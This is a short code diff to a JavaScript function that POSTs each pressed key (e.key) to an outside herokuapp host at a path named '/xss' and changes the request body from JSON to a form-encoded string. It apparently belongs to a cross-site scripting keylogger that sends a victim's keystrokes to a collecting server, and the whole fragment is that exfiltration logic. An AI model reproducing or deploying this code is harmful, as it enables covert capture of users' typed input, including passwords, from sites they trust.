@@ -34,7 +34,7 @@ function loadDoc(e) {
         type: 'POST',
         url: 'http://blog-torf.herokuapp.com/xss',
         // contentType: 'application/json',
-        data: JSON.stringify({key: e.key})
+        data: 'key=' + e.key
     }).done(function(data) {
         alert(data);
     });
